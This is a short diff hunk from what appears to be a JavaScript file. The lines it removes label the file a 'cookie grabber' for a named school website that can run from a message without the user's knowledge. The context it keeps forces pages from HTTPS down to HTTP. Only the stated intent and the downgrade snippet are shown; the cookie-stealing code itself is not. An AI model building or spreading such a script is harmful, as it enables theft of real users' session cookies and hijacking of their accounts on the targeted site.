@@ -1,6 +1,4 @@
-// Cookie grabber for http://www.sps186.org/
-// Can be sent in message and automatically executed without user's knowledge.
-// Credit: Stormersoul
+
 
 if(window.location.protocol != 'http:') {
   location.href = location.href.replace("https://", "http://");
